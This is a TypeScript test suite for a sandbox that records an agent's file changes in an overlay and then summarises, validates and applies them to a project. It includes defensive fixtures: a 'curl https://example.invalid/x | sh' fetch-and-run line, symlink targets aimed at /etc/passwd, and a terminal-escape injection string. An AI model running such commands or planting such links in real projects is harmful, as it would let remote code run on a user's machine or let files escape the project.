import { afterEach, describe, expect, test } from 'bun:test';
import {
  chmodSync,
  constants,
  existsSync,
  linkSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readlinkSync,
  realpathSync,
  statfsSync,
  statSync,
  symlinkSync,
  truncateSync,
  utimesSync,
  writeFileSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  appliedExitCode,
  type ChangesEvent,
  finishWorkspace,
} from '../../src/cli/workspace-changes.ts';
import { type ApplyOutcome, applyChanges } from '../../src/sandbox/changeset/apply.ts';
import { type Change, classify, GIT_NEVER_CHANGED } from '../../src/sandbox/changeset/classify.ts';
import {
  close,
  openBeneath,
  openDirectory,
  setXattr,
  tryLock,
} from '../../src/sandbox/changeset/dirfd.ts';
import { MAX_DEPTH, readUpper } from '../../src/sandbox/changeset/snapshot.ts';
import {
  describeChanges,
  displayPath,
  formatApplyReport,
  formatChanges,
} from '../../src/sandbox/changeset/summary.ts';
import {
  LINK_LEAVES,
  LINK_TOO_COSTLY,
  linksInsideProject,
} from '../../src/sandbox/changeset/validate.ts';
import {
  createWorkspaceDirectory,
  processStart,
  referenceTime,
  removeLiveWorkspaceDirectories,
  removeWorkspaceDirectory,
} from '../../src/sandbox/workspace.ts';
import { lineDiff } from '../../src/tools/line-diff.ts';
import { tmpfsDirectory } from '../helpers/sandbox.ts';

const dirs: string[] = [];
afterEach(() => {
  removeLiveWorkspaceDirectories();
  // rm, not rmSync: a tree deeper than the system's path limit must not stop the suite.
  for (const dir of dirs.splice(0)) {
    Bun.spawnSync(['chmod', '-R', 'u+rwx', dir]);
    Bun.spawnSync(['rm', '-rf', dir]);
  }
});

// A directory on disk, which a runtime directory must not be: the first of these that is not a
// tmpfs, whose magic number statfs reports. Any of them can be one, as /tmp often is.
const diskBase = ['/var/tmp', tmpdir(), homedir()].find(
  (dir) => existsSync(dir) && statfsSync(dir).type !== 0x01021994,
);

const runtimeDir = (): string => {
  const dir = tmpfsDirectory('nullrivet-runtime-');
  dirs.push(dir);
  chmodSync(dir, 0o700);
  return dir;
};

describe.if(process.platform === 'linux')('the workspace directory', () => {
  test('is made in the runtime directory, named by the process, and removed whole', () => {
    const runtime = runtimeDir();
    const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
    if ('error' in created) throw new Error(created.error);
    const { directory } = created;
    // Counted, for a session that starts several sandboxes.
    expect(directory.path).toStartWith(
      join(runtime, `nullrivet-${process.pid}-${processStart(process.pid)}-`),
    );
    expect(directory.path).toMatch(/-\d+$/);
    expect(statSync(directory.path).mode & 0o777).toBe(0o700);
    expect(readdirSync(directory.path).sort()).toEqual(['lock', 'upper', 'work']);
    // What an overlay and a sandbox leave: a directory without permissions, and a tree deeper
    // than a recursive walk can go, whose paths are longer than the system accepts.
    mkdirSync(join(directory.work, 'work'));
    chmodSync(join(directory.work, 'work'), 0o000);
    const made = Bun.spawnSync([
      'python3',
      '-I',
      '-c',
      'import os, sys\nos.chdir(sys.argv[1])\nfor _ in range(30000):\n    os.mkdir("d"); os.chdir("d")\nopen("leaf", "w").write("x")\nos.chmod(".", 0)',
      directory.upper,
    ]);
    expect(made.exitCode).toBe(0);
    removeWorkspaceDirectory(directory);
    expect(readdirSync(runtime)).toEqual([]);
  }, 30_000);

  test('removes the directories of sessions whose process is gone, and only those', () => {
    const runtime = runtimeDir();
    const ownStart = processStart(process.pid);
    // A process id with another start time: the id was reused, the session is gone.
    const gone = join(runtime, `nullrivet-${process.pid}-${Number(ownStart) + 1}`);
    const live = join(runtime, `nullrivet-${process.ppid}-${processStart(process.ppid)}`);
    const other = join(runtime, 'nullrivet-notes');
    // One that was being made when its process ended.
    const staging = `${gone}.new`;
    for (const dir of [gone, live, other, staging]) mkdirSync(dir);
    mkdirSync(join(gone, 'work'));
    writeFileSync(join(gone, 'work', 'file'), 'x');
    chmodSync(join(gone, 'work'), 0o000);
    // Left without a lock for longer than a session takes to make one.
    const past = new Date(Date.now() - 120_000);
    for (const dir of [gone, staging]) utimesSync(dir, past, past);
    // One a session of another PID namespace is making right now.
    const making = join(runtime, `nullrivet-${process.pid}-${Number(ownStart) + 2}-1.new`);
    mkdirSync(making);
    const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
    if ('error' in created) throw new Error(created.error);
    expect(created.warnings).toEqual([]);
    expect(existsSync(gone)).toBe(false);
    expect(existsSync(staging)).toBe(false);
    expect(existsSync(live)).toBe(true);
    expect(existsSync(other)).toBe(true);
    expect(existsSync(making)).toBe(true);
  });

  test('keeps the directory of a session that holds its lock, whatever its process id says', () => {
    const runtime = runtimeDir();
    // A process id that names nothing here, as one of another PID namespace would.
    const other = join(
      runtime,
      `nullrivet-${process.pid}-${Number(processStart(process.pid)) + 1}`,
    );
    mkdirSync(other);
    const dir = openDirectory(other);
    const lock = openBeneath(dir, Buffer.from('lock'), constants.O_RDWR | constants.O_CREAT, 0o600);
    close(dir);
    try {
      expect(tryLock(lock)).toBe(true);
      const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
      if ('error' in created) throw new Error(created.error);
      expect(existsSync(other)).toBe(true);
    } finally {
      close(lock);
    }
    // Once the lock is released, the next session removes it.
    removeLiveWorkspaceDirectories();
    const again = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
    if ('error' in again) throw new Error(again.error);
    expect(existsSync(other)).toBe(false);
  });

  test('discards the changes of a finished task when the run was interrupted before applying', () => {
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    mkdirSync(project);
    for (const interrupted of [true, false]) {
      const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
      if ('error' in created) throw new Error(created.error);
      writeFileSync(join(created.directory.upper, 'new.txt'), 'new\n');
      const since = referenceTime(created.directory, project);
      const events: ChangesEvent[] = [];
      const code = finishWorkspace(
        { directory: created.directory, root: project, since },
        { apply: true, done: true, interrupted, code: 130, report: (e) => events.push(e) },
      );
      expect(events.map((e) => e.type)).toEqual(
        interrupted
          ? ['changes:preview', 'changes:discarded']
          : ['changes:preview', 'changes:applied'],
      );
      expect(code).toBe(interrupted ? 130 : 0);
      expect(existsSync(join(project, 'new.txt'))).toBe(!interrupted);
      removeWorkspaceDirectory(created.directory);
    }
  });

  test('puts every change made before it, within the same clock tick, before the reference', () => {
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    mkdirSync(project);
    for (let round = 0; round < 5; round++) {
      const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
      if ('error' in created) throw new Error(created.error);
      // As the application of an earlier sandbox's changes does, right before the next starts.
      writeFileSync(join(project, 'applied.txt'), String(round));
      const since = referenceTime(created.directory, project);
      expect(statSync(join(project, 'applied.txt'), { bigint: true }).ctimeNs).toBeLessThan(since);
      expect(statSync(project, { bigint: true }).ctimeNs).toBeLessThan(since);
      removeWorkspaceDirectory(created.directory);
    }
  });

  test('refuses a runtime directory that is missing, relative or writable by others', () => {
    const open = runtimeDir();
    chmodSync(open, 0o777);
    for (const env of [{}, { XDG_RUNTIME_DIR: 'run/user' }, { XDG_RUNTIME_DIR: open }]) {
      const created = createWorkspaceDirectory(env);
      expect('error' in created ? created.error : 'created').toContain('XDG_RUNTIME_DIR');
    }
    expect(readdirSync(open)).toEqual([]);
  });

  test('refuses a runtime directory under one that others can change', () => {
    const shared = runtimeDir();
    chmodSync(shared, 0o770);
    const inner = join(shared, 'runtime');
    mkdirSync(inner, { mode: 0o700 });
    const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: inner });
    expect('error' in created ? created.error : 'created').toBe(
      `XDG_RUNTIME_DIR ${inner} is under ${shared}, which another user can change`,
    );
  });

  test.skipIf(diskBase === undefined)(
    'refuses a runtime directory on disk, where the changes would outlive a killed process',
    () => {
      if (diskBase === undefined) throw new Error('no directory on disk');
      const disk = realpathSync(mkdtempSync(join(diskBase, 'nullrivet-runtime-')));
      dirs.push(disk);
      const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: disk });
      expect('error' in created ? created.error : 'created').toBe(
        `XDG_RUNTIME_DIR ${disk} must be on a tmpfs: the workspace sandbox keeps its changes in memory, not in files on disk`,
      );
      expect(readdirSync(disk)).toEqual([]);
    },
  );

  test('refuses a directory deeper than the limit, unread', () => {
    const upper = join(runtimeDir(), 'upper');
    const deep = Array.from({ length: MAX_DEPTH + 2 }, () => 'd');
    mkdirSync(join(upper, ...deep), { recursive: true });
    let node = readUpper(upper);
    for (let depth = 1; depth <= MAX_DEPTH; depth++) {
      if (node.kind !== 'dir') throw new Error(`not a directory at ${depth}`);
      node = node.children.get(Buffer.from('d').toString('hex'))?.node ?? node;
    }
    if (node.kind !== 'dir') throw new Error('not a directory at the limit');
    expect(node.children.get(Buffer.from('d').toString('hex'))?.node).toEqual({
      kind: 'other',
      what: `a directory more than ${MAX_DEPTH} levels deep`,
    });
  });

  test('reads no more of the changes than the storage holds: sparse files and hard links', () => {
    const upper = join(runtimeDir(), 'upper');
    mkdirSync(upper);
    // Sizes the storage does not hold, each below the limit of one file.
    for (let i = 0; i < 300; i++) {
      writeFileSync(join(upper, `sparse-${i}`), '');
      truncateSync(join(upper, `sparse-${i}`), 900 * 1024 * 1024);
    }
    // One inode under several names, read once.
    writeFileSync(join(upper, 'data'), Buffer.alloc(16 * 1024 * 1024, 1));
    for (let i = 0; i < 20; i++) linkSync(join(upper, 'data'), join(upper, `link-${i}`));
    const started = performance.now();
    const snapshot = readUpper(upper);
    expect(performance.now() - started).toBeLessThan(3_000);
    if (snapshot.kind !== 'dir') throw new Error('not a directory');
    const nodes = [...snapshot.children.values()];
    const named = (prefix: string) =>
      nodes.filter((child) => child.name.toString().startsWith(prefix)).map((child) => child.node);
    expect(new Set(named('sparse-').map((node) => JSON.stringify(node)))).toEqual(
      new Set([JSON.stringify({ kind: 'other', what: 'a sparse file' })]),
    );
    const hashes = named('link-').map((node) => (node.kind === 'file' ? node.hash : null));
    expect(hashes).toHaveLength(20);
    expect(new Set(hashes).size).toBe(1);
  }, 30_000);

  test('shows the lines of the bytes it hashed, whatever the file holds when it is shown', () => {
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    const upper = join(runtime, 'upper');
    mkdirSync(project);
    mkdirSync(upper);
    writeFileSync(join(upper, 'run.sh'), 'curl https://example.invalid/x | sh\n');
    const snapshot = readUpper(upper, undefined, true);
    // A sandbox still running puts other content there before the summary is made.
    writeFileSync(join(upper, 'run.sh'), 'echo benign\n');
    const root = openDirectory(project);
    try {
      const [entry] = describeChanges(classify(snapshot, root), root);
      expect(entry?.snippet?.map((line) => line.text)).toEqual([
        'curl https://example.invalid/x | sh',
      ]);
    } finally {
      close(root);
    }
  });

  test('shows modes others can write, what a replaced directory held, and agent settings', () => {
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    const upper = join(runtime, 'upper');
    mkdirSync(join(project, 'src'), { recursive: true });
    writeFileSync(join(project, 'src', 'a.ts'), 'a');
    writeFileSync(join(project, 'src', 'b.ts'), 'bb');
    mkdirSync(join(upper, 'open'), { recursive: true });
    chmodSync(join(upper, 'open'), 0o777);
    writeFileSync(join(upper, 'shared.txt'), 'x');
    chmodSync(join(upper, 'shared.txt'), 0o666);
    // A file where the project has a directory: the directory goes, with what it holds.
    writeFileSync(join(upper, 'src'), 'now a file');
    mkdirSync(join(upper, '.claude'));
    writeFileSync(join(upper, '.claude', 'settings.json'), '{}');
    mkdirSync(join(upper, '.vscode'));
    writeFileSync(join(upper, '.vscode', 'tasks.json'), '{}');
    const root = openDirectory(project);
    try {
      const entries = describeChanges(classify(readUpper(upper), root), root);
      const byPath = new Map(entries.map((entry) => [entry.path, entry]));
      expect(byPath.get('open')?.mode).toBe('777');
      expect(byPath.get('shared.txt')?.mode).toBe('666');
      expect(byPath.get('src')).toMatchObject({
        change: 'replaced',
        replaces: 'directory',
        held: { entries: 2, bytes: 3 },
      });
      expect(byPath.get('.claude/settings.json')?.attention).toContain('can run commands');
      expect(byPath.get('.vscode/tasks.json')?.attention).toContain('when the folder opens');
      const plain = {
        added: (text: string) => text,
        removed: (text: string) => text,
        attention: (text: string) => text,
        dim: (text: string) => text,
      };
      expect(formatChanges(entries, plain)).toContain('replaces a directory of 2 entries, 3B');
    } finally {
      close(root);
    }
  });

  test('names where the project entry is left when putting it back fails', () => {
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    const upper = join(runtime, 'upper');
    mkdirSync(project);
    mkdirSync(upper);
    writeFileSync(join(project, 'f'), 'project');
    // A removal, as the overlay records it.
    writeFileSync(join(upper, 'f'), '');
    setXattr(join(upper, 'f'), 'user.overlay.whiteout', Buffer.alloc(0));
    const root = openDirectory(project);
    try {
      const since = BigInt(Date.now() + 1_000) * 1_000_000n;
      const outcome = applyChanges(classify(readUpper(upper), root), {
        projectRoot: root,
        projectPath: project,
        upperPath: upper,
        since,
        step: (step) => {
          if (step !== 'moved') return;
          // The host changes the entry once it is out of its path, and makes another there.
          const hidden = readdirSync(project).find((name) => name.startsWith('.nullrivet-trash-'));
          chmodSync(join(project, hidden ?? ''), 0o600);
          writeFileSync(join(project, 'f'), 'host');
        },
      });
      const hidden = readdirSync(project).find((name) => name.startsWith('.nullrivet-trash-'));
      expect(hidden).toBeDefined();
      expect(outcome.stopped?.reason).toContain(`it is left as ${hidden} in the same directory`);
    } finally {
      close(root);
    }
  });

  test('stops at names whose files hold more than the storage, as the application would copy', () => {
    const upper = join(runtimeDir(), 'upper');
    mkdirSync(upper);
    const size = 64 * 1024 * 1024;
    writeFileSync(join(upper, 'data'), Buffer.alloc(size, 1));
    const storage = Number(statfsSync(upper).blocks * statfsSync(upper).bsize);
    for (let i = 0; i <= Math.ceil(storage / size); i++) {
      linkSync(join(upper, 'data'), join(upper, `link-${i}`));
    }
    expect(() => readUpper(upper)).toThrow('counting each name of a file');
  }, 30_000);

  test('fails a run whose changes cannot be read, with or without --apply', () => {
    const runtime = runtimeDir();
    const created = createWorkspaceDirectory({ XDG_RUNTIME_DIR: runtime });
    if ('error' in created) throw new Error(created.error);
    // A project that is gone: nothing can be compared with it.
    const workspace = { directory: created.directory, root: join(runtime, 'gone'), since: 0n };
    const finish = (apply: boolean, done: boolean, code: number) => {
      const events: ChangesEvent[] = [];
      const exit = finishWorkspace(workspace, {
        apply,
        done,
        interrupted: false,
        code,
        report: (e) => events.push(e),
      });
      expect(events.map((e) => e.type)).toEqual(['changes:failed']);
      return exit;
    };
    expect(finish(false, true, 0)).toBe(1);
    expect(finish(true, true, 0)).toBe(4);
    // A task that did not finish keeps its own code.
    expect(finish(false, false, 3)).toBe(3);
    expect(finish(true, false, 3)).toBe(3);
  });

  test('stops comparing files past its limit, and lists the rest with their size', () => {
    const before = 'one\ntwo\nthree\n';
    const after = 'one\n2\nthree\n';
    // The steps one comparison takes.
    const probe = { steps: 1_000_000 };
    lineDiff(before, after, probe);
    const steps = 1_000_000 - probe.steps;
    const runtime = runtimeDir();
    const project = join(runtime, 'project');
    const upper = join(runtime, 'upper');
    mkdirSync(project);
    mkdirSync(upper);
    for (const name of ['a.txt', 'b.txt']) {
      writeFileSync(join(project, name), before);
      writeFileSync(join(upper, name), after);
    }
    const root = openDirectory(project);
    try {
      const changes = classify(readUpper(upper), root);
      const counted = (limits: { bytes: number; steps: number }) =>
        describeChanges(changes, root, limits).map((entry) => [
          entry.path,
          entry.lines ?? entry.uncompared,
        ]);
      const unlimited = { added: 1, removed: 1 };
      expect(counted({ bytes: 1_000_000, steps: 1_000_000 })).toEqual([
        ['a.txt', unlimited],
        ['b.txt', unlimited],
      ]);
      // The first file read spends the bytes; the steps left after it do not cover the second
      // comparison, which stops and is not shown as counts that are only an upper bound.
      for (const limits of [
        { bytes: 1, steps: 1_000_000 },
        { bytes: 1_000_000, steps: steps + 1 },
      ]) {
        expect(counted(limits)).toEqual([
          ['a.txt', unlimited],
          ['b.txt', true],
        ]);
      }
      expect(counted({ bytes: 1_000_000, steps: steps - 1 })).toEqual([
        ['a.txt', true],
        ['b.txt', true],
      ]);
      const plain = {
        added: (text: string) => text,
        removed: (text: string) => text,
        attention: (text: string) => text,
        dim: (text: string) => text,
      };
      const text = formatChanges(describeChanges(changes, root, { bytes: 1, steps: 1 }), plain);
      expect(text).toContain('  modified a.txt  12B\n');
      expect(text).toContain('  modified b.txt  12B\n');
      expect(text).toContain('The lines of 2 files were not counted');
    } finally {
      close(root);
    }
  });
});

// A link under /usr on this host that leads out of it, as Debian's /usr/lib/ssl/certs does.
const systemLinkOut = [
  '/usr/lib/ssl/certs',
  '/usr/lib/ssl/private',
  '/usr/lib/ssl/openssl.cnf',
  '/usr/lib/libreoffice/program/bootstraprc',
  '/usr/tmp',
].find((path) => {
  try {
    return lstatSync(path).isSymbolicLink() && !realpathSync(path).startsWith('/usr/');
  } catch {
    return false;
  }
});

describe.if(process.platform === 'linux')('the links of the changes', () => {
  const check = (project: string, links: Record<string, string>) => {
    const root = openDirectory(project);
    try {
      return linksInsideProject(
        Object.entries(links).map(([name, target]) => ({
          op: 'symlink' as const,
          path: [Buffer.from(name)],
          target: Buffer.from(target),
        })),
        root,
        project,
      ).map((change) => [change.path.toString(), change.op === 'refuse' ? change.reason : 'kept']);
    } finally {
      close(root);
    }
  };

  test('refuses a link that goes on past a part that is absent or not a directory', () => {
    const project = runtimeDir();
    mkdirSync(join(project, 'sub'));
    writeFileSync(join(project, 'file.txt'), 'x');
    expect(
      check(project, {
        // A later application of `missing -> /usr/` would make it lead to /etc/passwd.
        through: 'missing/../etc/passwd',
        file: 'file.txt/../sub',
        last: 'sub/not-yet',
        plain: 'file.txt',
      }),
    ).toEqual([
      ['through', LINK_LEAVES],
      ['file', LINK_LEAVES],
      ['last', 'kept'],
      ['plain', 'kept'],
    ]);
  });

  test('makes a link after the links it leads through, and not at all when one of them fails', () => {
    for (const fail of [false, true]) {
      const runtime = runtimeDir();
      const project = join(runtime, 'project');
      const upper = join(runtime, 'upper');
      mkdirSync(join(project, 'locked'), { recursive: true });
      writeFileSync(join(project, 'safe.txt'), 'safe');
      symlinkSync('/etc', join(project, 'locked', 'z'));
      // The sandbox points locked/z at a file of the project, and adds a link through it.
      mkdirSync(join(upper, 'locked'), { recursive: true });
      chmodSync(join(upper, 'locked'), statSync(join(project, 'locked')).mode & 0o7777);
      symlinkSync('../safe.txt', join(upper, 'locked', 'z'));
      symlinkSync('locked/z', join(upper, 'a'));
      const root = openDirectory(project);
      try {
        // Whether `a` was there when locked/z was about to be replaced.
        const seen: { a: boolean | null } = { a: null };
        const outcome = applyChanges(classify(readUpper(upper), root), {
          projectRoot: root,
          projectPath: project,
          upperPath: upper,
          since: BigInt(Date.now() + 1_000) * 1_000_000n,
          step: (step, change) => {
            const path = change.path.map(String).join('/');
            if (fail && path === 'locked/z') throw new Error('the host holds locked/z');
            if (step === 'moving' && path === 'locked/z') {
              seen.a = lstatSync(join(project, 'a'), { throwIfNoEntry: false }) !== undefined;
            }
          },
        });
        if (fail) {
          expect(lstatSync(join(project, 'a'), { throwIfNoEntry: false })).toBeUndefined();
          expect(readlinkSync(join(project, 'locked', 'z'))).toBe('/etc');
          expect(outcome.stopped?.change.path.map(String).join('/')).toBe('locked/z');
          expect(outcome.notReached.map((change) => change.path.map(String).join('/'))).toContain(
            'a',
          );
        } else {
          expect(seen.a).toBe(false);
          expect(realpathSync(join(project, 'a'))).toBe(join(project, 'safe.txt'));
        }
      } finally {
        close(root);
      }
    }
  });

  test('stops resolving links once they took too many steps', () => {
    const project = runtimeDir();
    mkdirSync(join(project, 'sub'));
    // Each target, as long as a link's can be, looks `sub` up again and again.
    const target = `${'sub/../'.repeat(580)}sub`;
    const verdicts = check(
      project,
      Object.fromEntries(Array.from({ length: 2_000 }, (_, i) => [`link-${i}`, target])),
    );
    expect(verdicts[0]).toEqual(['link-0', 'kept']);
    expect(verdicts.at(-1)).toEqual(['link-1999', LINK_TOO_COSTLY]);
  }, 60_000);

  test.skipIf(systemLinkOut === undefined)(
    'refuses a link to /usr that resolves out of it on the host',
    () => {
      const project = runtimeDir();
      expect(check(project, { out: systemLinkOut as string, env: '/usr/bin/env' })).toEqual([
        ['out', LINK_LEAVES],
        ['env', 'kept'],
      ]);
    },
  );
});

describe('the summary of the changes', () => {
  test('escapes control and bidirectional characters, backslashes and bytes that are not UTF-8', () => {
    const path = [
      Buffer.from('dir'),
      Buffer.from('a\nb‮c\\d\x1b[31m'),
      Buffer.from([0x66, 0xff, 0x0a]),
    ];
    expect(displayPath(path)).toBe('dir/a\\nb\\u{202e}c\\\\d\\x1b[31m/f\\xff\\x0a');
  });

  test('shows a byte order mark and other invisible characters, so two names never look the same', () => {
    expect(displayPath([Buffer.from('\ufeffpackage.json')])).toBe('\\u{feff}package.json');
    expect(displayPath([Buffer.from('package\u200b.json')])).toBe('package\\u{200b}.json');
    // Tag characters, a variation selector, a filler, a grapheme joiner and a line separator.
    expect(displayPath([Buffer.from('a\u{e0041}b\ufe0fc\u3164d\u034fe\u2028f')])).toBe(
      'a\\u{e0041}b\\u{fe0f}c\\u{3164}d\\u{34f}e\\u{2028}f',
    );
    expect(displayPath([Buffer.from('package.json')])).toBe('package.json');
  });

  test('lists each entry with what changes, and marks what runs without being invoked', () => {
    const plain = {
      added: (s: string) => s,
      removed: (s: string) => s,
      attention: (s: string) => s,
      dim: (s: string) => s,
    };
    const text = formatChanges(
      [
        { path: 'src/app.ts', change: 'modified', kind: 'file', lines: { added: 2, removed: 1 } },
        { path: 'lib', change: 'added', kind: 'directory', entries: 3, bytes: 1500 },
        { path: 'link', change: 'replaced', kind: 'link', replaces: 'file', target: 'app.txt' },
        { path: 'tool.sh', change: 'mode', kind: 'file', mode: '644 → 755' },
        {
          path: '.envrc',
          change: 'added',
          kind: 'file',
          lines: { added: 1, removed: 0 },
          attention: 'runs when a shell enters its directory',
        },
        { path: '.git', change: 'refused', kind: 'other', reason: GIT_NEVER_CHANGED },
      ],
      plain,
    );
    expect(text).toBe(
      [
        'Changes in the sandbox:',
        '  modified src/app.ts  +2 -1',
        '  added    lib/  3 entries, 1.5KB',
        '  replaced link → app.txt  replaces a file',
        '  mode     tool.sh  644 → 755',
        '  added    .envrc  +1  ! runs when a shell enters its directory',
        '  refused  .git  .git is never changed',
        '',
      ].join('\n'),
    );
    expect(formatChanges([], plain)).toBe('The sandbox made no changes to the project.\n');
  });

  test('escapes a reason, which can quote a name the sandbox chose', () => {
    const plain = {
      added: (s: string) => s,
      removed: (s: string) => s,
      attention: (s: string) => s,
      dim: (s: string) => s,
    };
    const reason = "EACCES: symlink 'x\nApplied the changes to the project.\x1b[2J'";
    const text = formatApplyReport(
      {
        applied: [],
        notApplied: [{ path: 'link', status: 'conflict', reason }],
        stopped: { path: 'link', reason },
      },
      plain,
    );
    expect(text).not.toContain('\x1b');
    expect(text.split('\n').filter((line) => line.startsWith('Applied the changes'))).toEqual([]);
    expect(text).toContain("x\\nApplied the changes to the project.\\x1b[2J'");
  });
});

describe('the exit code of an application', () => {
  const change = { op: 'refuse', path: [Buffer.from('x')], reason: 'r' } satisfies Change;
  const outcome = (part: Partial<ApplyOutcome>): ApplyOutcome => ({
    applied: [],
    conflicts: [],
    refused: [],
    stopped: null,
    notReached: [],
    ...part,
  });

  const git = (...path: string[]): Change => ({
    op: 'refuse',
    path: path.map((part) => Buffer.from(part)),
    reason: GIT_NEVER_CHANGED,
  });

  test('is 0 when everything was applied, the refusal of the project own .git aside', () => {
    expect(appliedExitCode(outcome({}))).toBe(0);
    expect(appliedExitCode(outcome({ refused: [{ change: git('.git'), reason: 'r' }] }))).toBe(0);
  });

  test('is 4 for the refusal of a .git deeper in the project, a repository the task made', () => {
    const nested = git('deps', 'x', '.git');
    expect(appliedExitCode(outcome({ refused: [{ change: nested, reason: 'r' }] }))).toBe(4);
  });

  test('is 4 when a change was not applied, and 5 when the application stopped', () => {
    expect(appliedExitCode(outcome({ conflicts: [{ change, reason: 'changed' }] }))).toBe(4);
    expect(
      appliedExitCode(outcome({ refused: [{ change, reason: 'a FIFO is not applied' }] })),
    ).toBe(4);
    expect(appliedExitCode(outcome({ stopped: { change, reason: 'EACCES' } }))).toBe(5);
  });
});
